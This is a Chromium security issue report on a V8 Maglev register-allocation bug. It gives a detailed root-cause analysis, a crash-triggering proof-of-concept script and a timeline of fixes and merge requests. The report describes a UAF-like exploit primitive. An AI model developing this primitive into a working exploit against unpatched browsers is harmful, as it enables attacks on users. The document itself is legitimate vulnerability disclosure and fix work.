# Incorrect handling during Maglev register allocation leads to improper memory access.

| Field | Value |
|-------|-------|
| **Issue ID** | [386143468](https://issues.chromium.org/issues/386143468) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript, Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ol...@chromium.org |
| **Created** | 2024-12-26 |
| **Bounty** | $11,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

I will explain why the crash occurred. In order to simplify the Maglev graph, I added the --no-maglev-optimistic-peeled-loops and --no-maglev-loop-peeling flags. These two flags are not necessary to trigger the crash.

## 1 Start From Bytecode

The bytecode of the `opt_me()` function is as follows.

```
        ....

        // if(flag) %OptimizeOsr();
   59 S> 0x8c400004020b @   39 : 0b 03             Ldar a0
         0x8c400004020d @   41 : a1 07             JumpIfToBooleanFalse [7] (0x8c4000040214 @ 48)
   76 S> 0x8c400004020f @   43 : 6c fe 01 f9 00    CallRuntime [OptimizeOsr], r0-r0

        // for (let j = 0; j < 1; j++) { }
  135 S> 0x8c4000040214 @   48 : 0c                LdaZero
         0x8c4000040215 @   49 : cb                Star3
  140 S> 0x8c4000040216 @   50 : 0d 01             LdaSmi [1]
  140 E> 0x8c4000040218 @   52 : 75 f6 00          TestLessThan r3, [0]
         0x8c400004021b @   55 : a3 0b             JumpIfFalse [11] (0x8c4000040226 @ 66)
  146 S> 0x8c400004021d @   57 : 0b f6             Ldar r3
         0x8c400004021f @   59 : 57 01             Inc [1]
         0x8c4000040221 @   61 : cb                Star3
  122 E> 0x8c4000040222 @   62 : 92 0c 00 02       JumpLoop [12], [0], [2] (0x8c4000040216 @ 50)

        // for (let k = 0; k < 1; k++) {
  223 S> 0x8c4000040226 @   66 : 0c                LdaZero
         0x8c4000040227 @   67 : cd                Star1
  228 S> 0x8c4000040228 @   68 : 0d 01             LdaSmi [1]
  228 E> 0x8c400004022a @   70 : 75 f8 03          TestLessThan r1, [3]
         0x8c400004022d @   73 : a3 47             JumpIfFalse [71] (0x8c4000040274 @ 144)
        
        // const tmp = a1 || 1;
  260 S> 0x8c400004022f @   75 : 0b 04             Ldar a1
         0x8c4000040231 @   77 : a0 04             JumpIfToBooleanTrue [4] (0x8c4000040235 @ 81)
         0x8c4000040233 @   79 : 0d 01             LdaSmi [1]
         0x8c4000040235 @   81 : cc                Star2
        // use = tmp % 4;
  376 S> 0x8c4000040236 @   82 : 4f 04 04          ModSmi [4], [4]
         0x8c4000040239 @   85 : ca                Star4
         0x8c400004023a @   86 : 18 03             LdaCurrentScriptContextSlot [3]
  370 E> 0x8c400004023c @   88 : b4 04             ThrowReferenceErrorIfHole [4]
         0x8c400004023e @   90 : 0b f5             Ldar r4
         0x8c4000040240 @   92 : 29 03             StaCurrentScriptContextSlot [3]
        // v = tmp;
  429 S> 0x8c4000040242 @   94 : 18 04             LdaCurrentScriptContextSlot [4]
  431 E> 0x8c4000040244 @   96 : b4 05             ThrowReferenceErrorIfHole [5]
         0x8c4000040246 @   98 : 0b f7             Ldar r2
         0x8c4000040248 @  100 : 29 04             StaCurrentScriptContextSlot [4]
        // yield 1
  478 S> 0x8c400004024a @  102 : 0d 01             LdaSmi [1]
         0x8c400004024c @  104 : ca                Star4
         0x8c400004024d @  105 : 12                LdaFalse
         0x8c400004024e @  106 : c9                Star5
         0x8c400004024f @  107 : 6f 0e f5 02       InvokeIntrinsic [_CreateIterResultObject], r4-r5
  478 E> 0x8c4000040253 @  111 : b9 f9 f9 04 01    SuspendGenerator r0, r0-r3, [1]
         0x8c4000040258 @  116 : ba f9 f9 04       ResumeGenerator r0, r0-r3
         0x8c400004025c @  120 : ca                Star4
         0x8c400004025d @  121 : 6f 09 f9 01       InvokeIntrinsic [_GeneratorGetResumeMode], r0-r0
         0x8c4000040261 @  125 : ab 06 02 00       SwitchOnSmiNoFeedback [6], [2], [0] { 0: @135, 1: @132 }
         0x8c4000040265 @  129 : 0b f5             Ldar r4
  478 E> 0x8c4000040267 @  131 : b1                Throw
         0x8c4000040268 @  132 : 0b f5             Ldar r4
         0x8c400004026a @  134 : b3                Return

        // k++ and loop back edge
  234 S> 0x8c400004026b @  135 : 0b f8             Ldar r1
         0x8c400004026d @  137 : 57 05             Inc [5]
         0x8c400004026f @  139 : cd                Star1
  210 E> 0x8c4000040270 @  140 : 92 48 00 06       JumpLoop [72], [0], [6] (0x8c4000040228 @ 68)

         0x8c4000040274 @  144 : 0e                LdaUndefined
  493 S> 0x8c4000040275 @  145 : b3                Return

```

There are two loops in the bytecode:

- The range of the bytecode for the first loop is `50~66`. After setting `%OptimizeOsr();`, the jump instruction `62: JumpLoop` of the first loop will trigger OSR optimization.
- The range of the bytecode for the second loop is `68~144`. The vulnerability occurs in the handling of this loop.

## 2 Maglev Graph Buiding

Add the `--trace-maglev-graph-building` flag to trace the graph building process.

### 2.1 Initialize

When Initialization, positions `50` and `68` are the jump targets of the `JumpLoop` bytecode for the two loops, so `MergePointInterpreterFrameState` objects are created at `merge_states_[50]` and `merge_states_[68]` (for simplicity, the loop peel optimization is turned off here).

```
- Non-standard entrypoint @50 by OSR from @62
  ...
- Creating loop merge state at @50
- Creating loop merge state at @68
  0x5c226139d4b8  n13: CheckpointedJump

```
### 2.2 First Loop

The process of handling the first loop is as follows. The interpreter frame state of

```
Initializing loop state...
  <this>: <unregistered node (nil)><> <- n1<> => n1: InitialValue(<this>) → (x), 1 uses<>
  a0: <unregistered node (nil)><> <- n2<> => n2: InitialValue(a0) → (x), 1 uses<>
  a1: <unregistered node (nil)><> <- n3<> => n3: InitialValue(a1) → (x), 1 uses<>
  <context>: <unregistered node (nil)><> <- n4<> => n4: InitialValue(<context>) → (x), 1 uses<>
  r0: <unregistered node (nil)><> <- n6<> => n6: InitialValue(r0) → (x), 1 uses<>
  r3: <unregistered node 0x5c226139cf38><> <- n9<> => <unregistered node 0x5c226139cf38>: Phi(r3) [n9:(x), <unregistered node (nil)>:(x)] → (x), 0 uses 🪦<>
  50 : 0d 01             LdaSmi [1]
== New block (loop header @0x5c226139cd40) at 0x029b00099599 <SharedFunctionInfo opt_me>==
* VOs (Interpreter Frame State): 
- Copying frame state from merge @0x5c226139cd40
* VOs (Interpreter Frame State): 
* VOs (Merge Frame State): 

...

  62 : 92 0c 00 02       JumpLoop [12], [0], [2]
  0x5c226139f920  n23: ReduceInterruptBudgetForLoop(9)
  0x5c226139fa30  n24: JumpLoop  
Merging loop backedge...
  <this>: n1<> <- n1<> => n1: InitialValue(<this>) → (x), 3 uses<>
  a0: n2<> <- n2<> => n2: InitialValue(a0) → (x), 3 uses<>
  a1: n3<> <- n3<> => n3: InitialValue(a1) → (x), 3 uses<>
  <context>: n4<> <- n4<> => n4: InitialValue(<context>) → (x), 3 uses<>
  r0: n6<> <- n6<> => n6: InitialValue(r0) → (x), 3 uses<>
  r3: n14<> <- n22<> => n14: Phi(r3) [n9:(x), n25:(x)] → (x), 2 uses<>

```

The process of handling the first loop is as follows. The interpreter frame state of `merge_states_[50]` changes twice when handling the first loop:

1. At the initialization of the loop, the current interpreter frame state is merged into `merge_states_[50]`, so the value of the `r3` register becomes `Phi(r3) [n9, nil]`.
2. When handling the loop jump `62: JumpLoop`, the current interpreter frame state is also merged into `merge_states_[50]`. At this time, the value of the `r3` register is `n22`, so `n22` is taken as the input node of the `Phi` node during the merge, resulting in `Phi(r3) [n9, n25]`.

Therefore, we find that **Maglev Graph Building only adds another input node to the `Phi` node when handling the `LoopJump` instruction, otherwise the `Phi` node only has one input node.**

### 2.3 Second Loop

The process of handling the second loop is as follows.

```
...
  68 : 0d 01             LdaSmi [1]
  0x5c226139fc60  n27: Jump
Merging...
  <this>: n1<> <- n1<> => n1: InitialValue(<this>) → (x), 3 uses<>
  a0: n2<> <- n2<> => n2: InitialValue(a0) → (x), 3 uses<>
  a1: n3<> <- n3<> => n3: InitialValue(a1) → (x), 3 uses<>
  <context>: <unregistered node 0x5c226139d288><> <- n4<> => <unregistered node 0x5c226139d288>: Phi(<context>) [n4:(x), <unregistered node (nil)>:(x)] → (x), 0 uses 🪦<>
  r0: <unregistered node 0x5c226139d330><> <- n6<> => <unregistered node 0x5c226139d330>: Phi(r0) [n6:(x), <unregistered node (nil)>:(x)] → (x), 0 uses 🪦<>
  r1: <unregistered node 0x5c226139d3d8><> <- n26<> => <unregistered node 0x5c226139d3d8>: Phi(r1) [n26:(x), <unregistered node (nil)>:(x)] → (x), 0 uses 🪦<>
== New block (loop header @0x5c226139cfc0) at 0x029b00099599 <SharedFunctionInfo opt_me>==
* VOs (Interpreter Frame State): 
- Copying frame state from merge @0x5c226139cfc0
* VOs (Interpreter Frame State): 
* VOs (Merge Frame State): 
  0x5c226139d288  n28: Phi(<context>) [n4:(x), <unregistered node (nil)>:(x)] → (x), 0 uses 🪦
  0x5c226139d330  n29: Phi(r0) [n6:(x), <unregistered node (nil)>:(x)] → (x), 0 uses 🪦
  0x5c226139d3d8  n30: Phi(r1) [n26:(x), <unregistered node (nil)>:(x)] → (x), 0 uses 🪦
...

**** Graph construction stops when encountering SuspendGenerator bytecode ****
 111 : b9 f9 f9 04 01    SuspendGenerator r0, r0-r3, [1]
  0x5c22613a2738  n56: RootConstant(optimized_out) → (x), 0 uses 🪦
  0x5c22613a2708  n57: GeneratorStore [n28:(x), n29:(x), n2:(x), n3:(x), n29:(x), n30:(x), n56:(x), n56:(x)]
  ! Clearing unstable node aspects
  0x5c22613a27e0  n58: Return [n50:(x)]


**** Bytecode between 116~140 are Dead ****
 116 : ba f9 f9 04       ResumeGenerator r0, r0-r3
== Dead ==
 116 : ba f9 f9 04       ResumeGenerator r0, r0-r3
...
 140 : 92 48 00 06       JumpLoop [72], [0], [6]
== Dead ==
 140 : 92 48 00 06       JumpLoop [72], [0], [6]

```

We focus on the changes in the interpreter frame state at `merge_states_[68]`.

1. When entering the Loop Header through the `Loop Preheader`, after merging the interpreter frame state, we can see that the `Phi` nodes corresponding to the two registers `r0, r1` only have one input node, and the other node is `nil`, indicating that it does not exist.
2. When processing the `SuspendGenerator` bytecode, Maglev generates a `Return` node and terminates graph building. This leads to the `140: JumpLoop` instruction of the second loop not being processed. Therefore, at the end of the graph building, **the `Phi` nodes corresponding to the two registers `r0, r1` still only have one input node**.

### 2.4 After graph building

The final constructed graph is as follows.

```
      3: InitialValue(a1) → (x), 11 uses
       ...
first loop ...    
│ 
 ╰─►Block b4    
     27: Jump b5    // jump to second loop
      │  with gap moves:
      │    - n4:(x) → 28: φᵀ <context> (x)
      │    - n6:(x) → 29: φᵀ r0 (x)
      │    - n26:(x) → 30: φᵀ r1 (x)
      ▼
    Block b5    // second loop
     28: φᵀ <context> (n4) (compressed) → (x), 10 uses
     29: φᵀ r0 (n6) (compressed) → (x), 7 uses
     30: φᵀ r1 (n26) (compressed) → (x), 7 uses 
         ↱ eager @70 (7 live vars)
     31: CheckedSmiUntag [n30:(x)] → (x), 2 uses
     32: Int32Compare(LessThan) [n31:(x), n17:(x)] → (x), 0 uses 🪦
╭────33: BranchIfInt32Compare(LessThan) [n31:(x), n17:(x)] b6 b10
│     ↓
│   Block b6    // a1 || 1
│╭───34: BranchIfToBooleanTrue [n3:(x)] b8 b7
││    ↓
││  Block b7
││╭──35: Jump b9
│││      with gap moves:
│││        - n15:(x) → 37: φᵀ <accumulator> (x)
│││
│╰─►Block b8
│ │  36: Jump b9
│ │   │  with gap moves:
│ │   │    - n3:(x) → 37: φᵀ <accumulator> (x)
│ │   ▼
│ ╰►Block b9
│    37: φᵀ <accumulator> (n3, n15) (compressed) → (x), 7 uses

```

We need to pay special attention to Block b5, which has two characteristics:

1. This is a Loop Header because it is the jump target of the `140: JumpLoop` bytecode.
2. It only has one predecessor, which is `27: Jump b5` in `Block b4`.

## 3 Phi untagging

This phase will optimize `37: φᵀ` into `37: φᴵ`, so all input nodes of Phi need to be converted to `Int32` type. Therefore, nodes `64, 65` are added to convert `a1` into `Int32` type.

```
      3: InitialValue(a1) → (x), 11 uses
     64: CheckedNumberOrOddballToFloat64(Number) [n3:(x)] → (x), 1 uses 
     65: CheckedTruncateFloat64ToInt32 [n64:(x)] → (x), 1 uses
       ...
first loop ...    
│ 
 ╰─►Block b4
     27: Jump b5     // jump to second loop
      │  with gap moves:
      │    - n4:(x) → 28: φᵀ <context> (x)
      │    - n6:(x) → 29: φᵀ r0 (x)
      │    - n26:(x) → 30: φᵀ r1 (x)
      ▼
    Block b5    // second loop
     28: φᵀ <context> (n4) (compressed) → (x), 10 uses
     29: φᵀ r0 (n6) (compressed) → (x), 7 uses
     30: φᵀ r1 (n26) (compressed) → (x), 7 uses 
     31: CheckedSmiUntag [n30:(x)] → (x), 2 uses
     32: Int32Compare(LessThan) [n31:(x), n17:(x)] → (x), 0 uses 🪦 
╭────33: BranchIfInt32Compare(LessThan) [n31:(x), n17:(x)] b6 b10
│     ↓
│   Block b6    // a1 || 1
│╭───34: BranchIfToBooleanTrue [n3:(x)] b8 b7
││    ↓
││  Block b7
││╭──35: Jump b9
│││      with gap moves:
│││        - n17:(x) → 37: φᴵ <accumulator> (x)
│││
│╰─►Block b8
│ │  36: Jump b9
│ │   │  with gap moves:
│ │   │    - n65:(x) → 37: φᴵ <accumulator> (x)
│ │   ▼
│ ╰►Block b9
│    37: φᴵ <accumulator> (n65, n17) → (x), 8 uses

```
## 4 Maglev Register Allocate

Add `--trace-maglev-regalloc` to view the log of register allocation.
We find that the value of the `v20/n65` node will be stored in the `rcx` register.

```
            Allocating v11/n3 inputs...
            Allocating result...
      11/3: InitialValue(a1) → [stack:-8|t], live range: [11-53]
            live regs: 

            Allocating v19/n64 inputs...
            - v11/n3 has arbitrary register
              gap move: [rcx|R|t] ← v11/n3:[stack:-8|t]
            - v11/n3 in clobbered [rcx|R|t] ← [rcx|R|t]
            ...
     19/64: CheckedNumberOrOddballToFloat64(Number) [v11/n3:[rcx|R|t]] → [xmm0|R|f64], live range: [19-20]
            live regs: rax=v18, xmm0=v19

            Allocating v20/n65 inputs...
            - v19/n64 has arbitrary register
            - v19/n64 in [xmm0|R|f64]
            ...
     20/65: CheckedTruncateFloat64ToInt32 [v19/n64:[xmm0|R|f64]] → [rcx|R|w32], live range: [20-35]
            live regs: rax=v18, rcx=v20
              constant gap move: [rdx|R|w32] ← v7/n17
            Using v18/n63...
              freeing v18/n63

```

However, a strange situation occurred when processing the jump instruction from `Block b4` to `Block b5`: **all `live regs` were cleared**, **`v28/n65` is no longer in `rcx`, and it was not spilled to the stack either**.

```
...
╰─►Block b4
    live regs: rcx=v20, rdx=v7    <=== v20 live in rcx
    [holes: 56.]
    Using v12/n4...
      freeing v12/n4
    Using v14/n6...
      freeing v14/n6
    Using v5/n26...
      freeing v5/n26
   0x27e30019959d <SharedFunctionInfo opt_me> (0x27e3000472d9 <String[9]: "./test.js">:13:22)
     68 : LdaSmi [1]
     27/27: Jump b5
         │  with gap moves:
         │    - v12/n4:[stack:-3|t] → 28: φᵀ <context> v-1(*)
         │    - v14/n6:[stack:3|t] → 29: φᵀ r0 v-1(*)
         │    - v5/n26:[constant:v-1] → 30: φᵀ r1 v-1(*)
         │  with register merges:
         ▼
    Block b5
    live regs:         <==== no live regs
    [holes: 56.]
    ...

```

**Because the position of the `v28/n65` node is invalid, a DCHECK fail will occur when attempting to get the allocation position of this node later.**

However, in the release build version, this will continue to execute. When processing `35/36: Jump b9`, a gap moves instruction will be generated: `(x) → 37: φᴵ`, attempting to load a value from an invalid address.

```
│╭───33/34: BranchIfToBooleanTrue [v11/n3:[rcx|R|t]] b8 b7
││       ↓
││  Block b7
││  live regs: rax=v29, rcx=v11, rdx=v30, rbx=v7, rdi=v28
││  [holes: 34-36 54.]
││  Using v7/n17...
││    freeing v7/n17
││   81 : Star2
││╭──34/35: Jump b9
│││         with gap moves:
│││           - v7/n17:[rbx|R|w32] → 37: φᴵ <accumulator> v-1(*)
│││         with register merges:
│││
│╰─►Block b8
│ │ live regs: rax=v29, rcx=v11, rdx=v30, rdi=v28
│ │ [holes: 54.]
│ │ Merging registers...
│ │   rax - incoming node same as node: v29/n29
│ │   rcx - incoming node same as node: v11/n3
│ │   rdx - incoming node same as node: v30/n30
│ │   rdi - incoming node same as node: v28/n28
│ │ Using v20/n65...
│ │   freeing v20/n65
│ │  35/36: Jump b9
│ │      │  with gap moves:
│ │      │    - v20/n65:(x) → 37: φᴵ <accumulator> v-1(*)    <==== Here
│ │      │  with register merges:
│ │      ▼
│ ╰►Block b9

```

This will ultimately lead to the generation of the `movq rbx,[rbp-0x58]` instruction during assembly. Note: `rbp-0x58` points to an invalid position in the stack frame, leading to incorrect memory access.

```
                  -- Block b8 - PreProcessBasicBlock@../../src/maglev/maglev-code-generator.cc:788
                  --   36: Jump b9 - Process@../../src/maglev/maglev-code-generator.cc:800
                  --   Gap moves: - EmitBlockEndGapMoves@../../src/maglev/maglev-code-generator.cc:902
                  --   * (x) → [rbx|R|w32] (n37) - EmitBlockEndGapMoves@../../src/maglev/maglev-code-generator.cc:930
0x5a1b47cc0226   1e6  488b5da8             REX.W movq rbx,[rbp-0x58]

```
## 5 Root Casue

Why are the `live regs` cleared when processing the jump instruction from `Block b4` to `Block b5`?

The root cause lies in the `StraightForwardRegisterAllocator::AllocateRegisters()` function.

```
void StraightForwardRegisterAllocator::AllocateRegisters() {
  ...
  for (block_it_ = graph_->begin(); block_it_ != graph_->end(); ++block_it_) {
    BasicBlock* block = *block_it_;
    current_node_ = nullptr;

    if (block->has_state()) {
      if (block->state()->is_exception_handler()) {
        ...
      } else if (block->state()->is_resumable_loop() && // <=== Key
                 block->state()->predecessor_count() <= 1) {
        // Loops that are only reachable through JumpLoop start from a blank
        // state of register values.
        // This should actually only support predecessor_count == 1, but we
        // currently don't eliminate resumable loop headers (and subsequent code
        // until the next resume) that end up being unreachable from JumpLoop.
        ClearRegisterValues();
      } else {
        InitializeRegisterValues(block->state()->register_state());
      }
    } else if (block->is_edge_split_block()) {
      InitializeRegisterValues(block->edge_split_block_register_state());
    }

    ...
  }
}

```

We need to pay special attention to the branch `block->state()->is_resumable_loop() && block->state()->predecessor_count() <= 1`.

- If a `BasicBlock` is a loop head, and this `BasicBlock` only has one predecessor, then this branch considers this to be a loop that can only be reached by `JumpLoop`. Such a loop should start from a completely blank register state, so it calls `ClearRegisterValues()` to clear the status of all registers.
- **However, `Block b5` is also a loop head with only one predecessor, but this predecessor comes from `Block b4`'s `Jump b5`, not the `JumpLoop` instruction. Therefore, it erroneously enters this branch and calls `ClearRegisterValues()` to clear the values in the current register. This results in the node value `v20/n65` stored in `rcx` being cleared.**

## 6 Some Thoughts

The relevant code for `is_resumable_loop()` in `AllocateRegisters()` comes from commit: 5e1ebeb9a56632c2f2dcf8837c1153f44052d94a.

This commit was introduced in 2022, meaning this vulnerability has been around for a long time and is deeply hidden.

This vulnerability provides us with a special primitive: constructing a loop header BasicBlock with only one predecessor. This way, during Maglev register allocation, all nodes before this loop can be removed from the register, leading to subsequent uses of these nodes encountering a situation similar to "UAF", accessing values at invalid addresses.

However, triggering a crash with this primitive is somewhat challenging. In some older versions, running this POC would also trigger `ClearRegisterValues()` during register allocation, erroneously clearing all live regs. For some unknown reasons, this did not lead to a crash, which might require additional constructions. Therefore, performing Commit Bisect based on crashes may not be accurate.

VERSION

poc.js has been tested in the latest version of v8, (commit `4a6960ee2d1be2cfd1e100de8f9b30441f653a43`), and it can trigger a crash.

REPRODUCTION CASE

poc.js:

```
let use = 0;
let v = 0;

function* opt_me(flag, a1) {
    // triggering Maglev OSR optimization
    if(flag)
        %OptimizeOsr();
    for (let j = 0; j < 1; j++) {
        ;
    }

    for (let k = 0; k < 1; k++) {
        const tmp = a1 || 1;
        // Triggers type conversion node of a1: OddBallOrHeapNumber=>Float64=>Int32
        // Passed to 'use' to avoid being optimized away
        use = tmp % 4;  
        v = tmp;
        // Generates SuspendGenerator instruction
        yield 1;
    }
}

%PrepareFunctionForOptimization(opt_me);
opt_me(false, 123).next();
print(v);
opt_me(false, 123).next();
print(v);

// Maglev OSR optimization
opt_me(true, 123).next();
print(v);

```

call v8 as followed:

```
./d8 \
    --allow-natives-syntax \
    --no-concurrent-recompilation \
    ./poc.js

```

crash:

```
#
# Fatal error in ../../src/maglev/maglev-ir.h, line 2495
# Debug check failed: is_loadable().
#

```

CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: 303f06e3

## Timeline

### me...@google.com (2024-12-26)

Thanks for the report. Assigning to the v8 triager (note that the Severity and FoundIn labels are provisional)

### cl...@appspot.gserviceaccount.com (2024-12-27)

Detailed Report: https://clusterfuzz.com/testcase?key=5460934579388416

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  is_loadable() in maglev-ir.h
  v8::internal::maglev::ValueNode::allocation
  v8::internal::maglev::StraightForwardRegisterAllocator::InitializeBranchTargetPh
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&revision=97922

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5460934579388416

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cf...@google.com (2024-12-27)

Thanks for the great report!  

@verwaest, could you PTAL?

### 24...@project.gserviceaccount.com (2024-12-27)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### pe...@google.com (2024-12-27)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-12-27)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ap...@google.com (2025-01-09)

Project: v8/v8  

Branch: main  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6157748>

[maglev] regalloc: handle non-loop resumable\_loops

---


Expand for full commit details
```
[maglev] regalloc: handle non-loop resumable_loops 
 
Resumable loops which are not loops can be either: 
 
1. An unreachable loop with only a back-edge 
2. A fall-through to a resumable loop with a dead back-edge 
 
Only (1) starts with an empty register state. 
 
Fixed: 386143468 
Change-Id: I67d6e042e44915ec5719fe8dfe840dbb28079d28 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6157748 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98016}

```

---

Files:

- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-interpreter-frame-state.h`
- M `src/maglev/maglev-regalloc.cc`

---

Hash: b44bd24761f1a2eae131bd90be15b5a68cc70f83  

Date:  Wed Jan 08 16:06:43 2025


---

### pe...@google.com (2025-01-09)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### pe...@google.com (2025-01-09)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M130. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to other stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M131. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M132. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M133. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ap...@google.com (2025-01-09)

Project: v8/v8  

Branch: main  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6158064>

[maglev] regalloc: Some refactoring and additional checks

---


Expand for full commit details
```
[maglev] regalloc: Some refactoring and additional checks 
 
Bug: 386143468 
Change-Id: I44ad08873d4bbff784a654e3ce3d752e61064471 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6158064 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98032}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- M `src/maglev/maglev-graph-builder.h`
- M `src/maglev/maglev-graph-printer.cc`
- M `src/maglev/maglev-interpreter-frame-state.h`
- M `src/maglev/maglev-ir.h`
- M `src/maglev/maglev-regalloc.cc`
- M `src/maglev/maglev-regalloc.h`

---

Hash: 8164ea8fd9e51b26bc7311e6cab34f95e3336016  

Date:  Thu Jan 09 16:05:19 2025


---

### 24...@project.gserviceaccount.com (2025-01-10)

ClusterFuzz testcase 5460934579388416 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=98015:98016

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### pe...@google.com (2025-01-10)

**Merge approved:** your change passed merge requirements and is auto-approved for M133. Please go ahead and merge the CL to branch 6943 (refs/branch-heads/6943) manually. Please contact milestone owner if you have questions.
Merge instructions: <https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md>
Owners: None (Android), None (iOS), andywu (ChromeOS), None (Desktop)

### pe...@google.com (2025-01-10)

Merge review required: M132 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), govind (iOS), alonbajayo (ChromeOS), srinivassista (Desktop)

### pe...@google.com (2025-01-10)

Merge review required: M131 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), obenedict (ChromeOS), pbommana (Desktop)

### pe...@google.com (2025-01-10)

Merge review required: M130 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
